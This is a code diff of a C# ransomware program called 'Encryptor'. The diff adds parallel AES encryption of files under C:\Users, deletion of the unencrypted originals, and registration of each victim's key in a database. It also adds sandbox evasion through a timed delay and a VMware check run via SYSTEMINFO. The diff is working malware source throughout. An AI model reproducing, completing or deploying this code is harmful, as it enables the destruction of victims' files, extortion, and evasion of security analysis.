@@ -7,13 +7,20 @@ using System.Data.SqlClient;
 using System.Diagnostics;
 using System.Dynamic;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
+using System.Runtime.CompilerServices;
 using System.Security.AccessControl;
 using System.Windows.Forms;
 using Decryptor;
 using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 using System.Windows.Forms.VisualStyles;
-
+using System;
+using System.IO;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Drawing;
 
 namespace Encryptor
 {
@@ -23,6 +30,10 @@ namespace Encryptor
 		//String key;
 		static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };
 		static List<string> toDelete;
+		static List<string> toEncrypt;
+		const int MINUTES_TO_WAIT = 3;
+		
+		
 		
 		//Hiding console prerequsites
 		[DllImport("kernel32.dll")]
@@ -33,36 +44,124 @@ namespace Encryptor
 		
 		public static void Main(string[] args)
 		{
-			hideConsole();
-
+			//hideConsole();
+			//waitGivenMinutes(MINUTES_TO_WAIT);
+			//checkSysteInfoForVM();
 			checkInsurance();
-			
+
 			AesCryptoServiceProvider aes = createCipher();
-			
-			// Decide on base directory
-			string baseDirectory = "C:\\Users";
-
-			toDelete = new List<string>();
-			// Encrypt the victims files 
-			itterate(baseDirectory, aes);
-			deleteUnencrypted();
-
-			// getting paied
-			//System.Console.WriteLine("Your feils have been encryptrd!");
-			
+			encryptAllFiles(aes);		
 			DB.addVictimToDB(aes);
 			
 			notifyUser();
-			
-			
 		}
+		
+		
+		
 
-
-
-		private static void test()
+		private static void encryptAllFiles(AesCryptoServiceProvider aes)
 		{
+			var watch = System.Diagnostics.Stopwatch.StartNew();
+			
+			
 			string baseDirectory = "C:\\Users";
+			//string baseDirectory = "C:\\test";
+			toDelete = new List<string>();
+			toEncrypt = new List<string>();
+			itterate(baseDirectory, aes);
+			encryptToEncryptList(aes);
+			deleteUnencrypted();
+			
+						
+			watch.Stop();
+			var elapsedMs = watch.ElapsedMilliseconds;
+			Console.WriteLine("Elapsed Time: "+ elapsedMs + "and in Seconds: "+ (elapsedMs/1000));
 		}
+
+		
+		
+		
+		private static void encryptToEncryptList(AesCryptoServiceProvider aes)
+		{
+			/*
+			foreach (var filePath in toEncrypt)
+			{
+				try
+				{
+					encryptFile(filePath, aes);
+
+				}
+				catch
+				{
+				}
+			}
+			*/
+			
+			Parallel.ForEach(toEncrypt, filePath =>
+				{
+					try
+					{
+						encryptFile(filePath, aes);
+
+					}
+					catch
+					{
+					}
+				}
+			);
+			
+			
+		}
+
+
+
+		/// <summary>
+		/// waites for a given amound of minutes in 5 second intervals
+		/// </summary>
+		/// <param name="minutes"></param>
+		private static void waitGivenMinutes(int minutes)
+		{
+			for (int i = 0; i < minutes; i++)
+			{
+				for (int j = 0; j < 12; j++)
+				{
+					System.Threading.Thread.Sleep(5000); //sleep for 5 seconds
+				}
+			}
+		}
+		
+		
+		
+		
+		/// <summary>
+		/// runs the SYSTEMINFO command in the terminal and checks if "VMware" appears in the output.
+		/// </summary>
+		private static void checkSysteInfoForVM()
+		{
+			ProcessStartInfo procStartInfo =
+				new ProcessStartInfo("cmd", "/c " + "SYSTEMINFO");
+
+			// The following commands are needed to redirect the standard output.
+			// This means that it will be redirected to the Process.StandardOutput StreamReader.
+			procStartInfo.RedirectStandardOutput = true;
+			procStartInfo.UseShellExecute = false;
+			// Do not create the black window.
+			procStartInfo.CreateNoWindow = true;
+			// Now we create a process, assign its ProcessStartInfo and start it
+			Process proc = new Process();
+			proc.StartInfo = procStartInfo;
+			proc.Start();
+			// Get the output into a string
+			string result = proc.StandardOutput.ReadToEnd();
+			// Display the command output.
+			//Console.WriteLine(result);
+			if (result.Contains("VMware"))
+			{
+				Console.WriteLine("VM Detected");
+				Environment.Exit(0);
+			}
+		}
+		
 		
 		
 		
@@ -76,9 +175,9 @@ namespace Encryptor
 				string message = "Good news! your isnurance paied off, your computer won't be encrypted again";
 				string caption = "Congradulations";
 				MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Exclamation);
-				Environment.Exit(0);
 			}
 		}
+		
 		
 		
 		
@@ -114,7 +213,8 @@ namespace Encryptor
 				{
 					try
 					{
-						encryptFile(filePath, aes);
+						//encryptFile(filePath, aes);
+						toEncrypt.Add(filePath);
 					}
 					catch 
 					{
@@ -144,6 +244,7 @@ namespace Encryptor
 
 		
 		
+		
 		/// <summary>
 		/// recives a file and a key and creates another file that has the same content only encrypted and then
 		/// deletes the original file
@@ -170,7 +271,6 @@ namespace Encryptor
 				while (bytesRead != 0);
 			}
 			toDelete.Add(filePath);
-			//File.Delete(filePath);
 			//System.Console.WriteLine("Encrypted: " + filePath);
 
 		}
@@ -198,11 +298,14 @@ namespace Encryptor
 		}
 
 		
+		
 
 		private static bool correctTargetExtension(string fileExtension){
 			return targetExtensions.Exists(e => e == fileExtension);
 		}
 
+		
+		
 		
 		/// <summary>
 		/// Create the Aes Key
@@ -224,6 +327,7 @@ namespace Encryptor
 			*/
 			return aes;
 		}
+		
 		
 		
 		
